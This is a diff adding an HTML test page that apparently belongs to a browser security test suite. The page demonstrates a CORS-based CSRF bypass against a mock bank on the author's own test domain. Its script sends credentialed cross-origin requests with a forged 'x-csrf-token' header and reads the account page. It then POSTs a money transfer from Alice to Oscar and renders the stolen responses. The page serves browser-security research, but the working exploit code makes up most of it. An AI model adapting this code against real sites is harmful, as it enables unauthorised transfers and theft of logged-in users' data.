@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+	<head>
+	<title>ACAC Testsuite</title>
+	<meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+	</head>
+	<body>
+	<div class="container">
+		<h3>CORS "X-CSRF-Token: true" Bypass with ACAH Edge 18</h3>
+		<ol>
+			<li style="max-width:50%" id="step1">Set cookies on c00kie.ninja (Bank.com). User is logged in then.</li>
+			<li style="max-width:50%" id="step2">Send request to vuln domain with X-CSRF-Token: true.</li>
+			<li style="max-width:50%" id="step3">POST should also work. Sending POST...</li>
+			<li style="max-width:50%" id="step4">Profit??</li>
+		</ol>
+		<p id="CORS Preflight">Server Config (CORS Preflight): <span style="color: grey">ACAO: Origin reflection, ACAC: true, ACAH: header1; header2</span></p>
+		<p id="CORS request">Server config (CORS Request): <span style="color: grey">ACAO: Origin reflection, ACAC: true</span></span></p>
+	<a class="btn btn-primary" href="https://much.ninja/" role="button">Back</a>
+	</div>
+
+	<div id="TestingArea"></div>
+	<script>
+		var markstep = function(step, message, color){
+			var step = document.getElementById(step);
+			var text = document.createElement('p');
+			text.innerText = message;
+			text.setAttribute("style", "color:" + color);
+			step.appendChild(text);
+		}
+		var renderhtml = function(step, message, color){
+			var step = document.getElementById(step);
+			var text = document.createElement('div');
+			// Fuck it
+			text.innerHTML = message;
+			text.setAttribute("style", "border-style: solid; color:" + color);
+			step.appendChild(text);
+		}
+		var startBypass = function(){
+			// bank.com site here c00kie.ninja
+			// Check reading first.
+			var target = "https://c00kie.ninja/banking/transfer.php";
+			var request = new XMLHttpRequest();
+			request.open('GET', target);
+			request.withCredentials = true;
+			request.setRequestHeader("x-csrf-token", "true");
+			request.onload = function(){
+				console.log("Response (GET):");
+				response = request.responseText;
+				console.log(response);
+				if(response !== undefined)
+					markstep("step2", "Done", "green");
+					renderhtml("step2", response, "black");
+				if(response === undefined){
+					markstep("step2", "Failed", "Red");
+					throw "Step 2 Failed";
+				}
+			sendMoney();
+			}
+			request.onerror = function(){
+				console.warn("CORS Error (GET)");
+				markstep("step2", "Failed", "Red");
+				throw "Step 2 Failed";
+			}
+			request.send();
+		};
+		var sendMoney = function(){
+			// bank.com site here c00kie.ninja
+			// Check reading first.
+			var target = "https://c00kie.ninja/banking/transfer.php";
+			var request = new XMLHttpRequest();
+			request.open('POST', target);
+			request.withCredentials = true;
+			request.setRequestHeader("x-csrf-token", "true");
+			request.onload = function(){
+				console.log("Response (POST):");
+				response = request.responseText;
+				console.log(response);
+				if(response !== undefined)
+					markstep("step3", "Done", "green");
+				if(response === undefined){
+					markstep("step3", "Failed", "Red");
+					throw "Step 3 Failed";
+				}
+			result();
+			}
+			request.onerror = function(){
+				console.warn("CORS Error (GET)");
+				markstep("step3", "Failed", "Red");
+				throw "Step 3 Failed";
+			}
+			request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
+			request.send("from=Alice&to=Oscar&amount=200&send=");
+		};
+		var result = function(){
+			var target = "https://c00kie.ninja/banking/transfer.php";
+			var request = new XMLHttpRequest();
+			request.open('GET', target);
+			request.withCredentials = true;
+			request.setRequestHeader("x-csrf-token", "true");
+			request.onload = function(){
+				renderhtml("step4", response, "black");
+			}
+			request.onerror = function(){
+				console.warn("CORS Error (GET)");
+			}
+			request.send();
+		};
+		// Set cookies first.
+		if(document.referrer.indexOf('c00kie.ninja') === -1){
+			document.getElementsByClassName('container')[0].innerText = "Setting cookies first";
+			//setTimeout(function(){window.location = "https://c00kie.ninja/COOKIES/SetCookies/cookies.php?pair=U2V0LUNvb2tpZTogZGVmYXVsdD0xOyBQYXRoPS9cclxuU2V0LUNvb2tpZTogbm9uZT0yOyBQYXRoPS87IFNhbWVTaXRlPU5vbmU7IFNlY3VyZVxyXG5TZXQtQ29va2llOiBsYXg9MzsgUGF0aD0vOyBTYW1lU2l0ZT1MYXhcclxuU2V0LUNvb2tpZTogc3RyaWN0PTQ7IFBhdGg9LzsgU2FtZVNpdGU9U3RyaWN0&redirect=https://much.ninja/CORS/CSRFBypass/acah-bypass.html";}, 1000);
+			setTimeout(function(){window.location = "https://c00kie.ninja/banking/transfer.php?name=Alice&login&redirect=CORS/CSRFBypass/acah-bypass.html";}, 1000);
+		}else{
+		// If cookies are set. Start.
+			markstep("step1", "Done", "green");
+			startBypass();
+		}
+	</script>
+	<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@0/dist/ua-parser.min.js"></script>
+	<script src="https://much.ninja/static/save.js"></script>
+	<!-- Bootstrap  -->
+	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+	</body>
+
+</html>
